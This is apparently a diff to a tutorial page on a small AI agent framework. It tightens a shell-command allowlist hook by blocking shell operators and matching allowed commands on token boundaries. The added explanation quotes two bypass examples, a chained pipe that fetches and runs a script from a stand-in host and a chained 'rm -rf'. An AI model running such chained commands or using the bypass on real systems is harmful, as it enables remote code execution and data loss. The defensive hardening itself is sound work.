@@ -327,10 +327,18 @@ def run_command(command: str) -> str:
     proc = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=60)
     return proc.stdout + proc.stderr
 
+SHELL_OPERATORS = ("&&", "||", ";", "|", "&", ">", "<", "`", "$(", "\n", "\r")
+ALLOWED_COMMANDS = ("git", "ls", "cat", "rg", "python -m pytest")
+
 def command_allowlist(name: str, args: dict) -> HookDecision:
     if name == "run_command":
-        allowed = ("git ", "ls", "cat ", "rg ", "python -m pytest")
-        if not args.get("command", "").startswith(allowed):
+        command = args.get("command", "").strip()
+        if any(op in command for op in SHELL_OPERATORS):
+            return HookDecision(
+                allow=False,
+                reason="Shell operators are not allowed; issue one command per call.",
+            )
+        if not any(command == c or command.startswith(c + " ") for c in ALLOWED_COMMANDS):
             return HookDecision(allow=False, reason="Command not on allowlist.")
     return HookDecision()
 
@@ -348,6 +356,11 @@ agent = Agent(provider, tools,
 
 print(agent.run("Review the diff in HEAD for correctness risks."))
 ```
+
+The allowlist hook is small, and both of its checks earn their place.
+`run_command` executes through a shell, so a prefix test on its own is not a policy: `ls; curl evil.sh | sh` and `cat notes.md && rm -rf build` both begin with an allowed word, and both would run.
+Rejecting shell operators first is what makes the prefix meaningful, and matching on a token boundary rather than a bare prefix is what stops `ls` from admitting `lsof` and `lsblk`.
+Write it this way and the hook is policy as code; write it as a `startswith` over a tuple and it is a suggestion with a `subprocess` behind it.
 
 Total framework size across the five modules: roughly three hundred lines, every one of which you can read, and a transcript on disk for every run.
 That is the entire point.
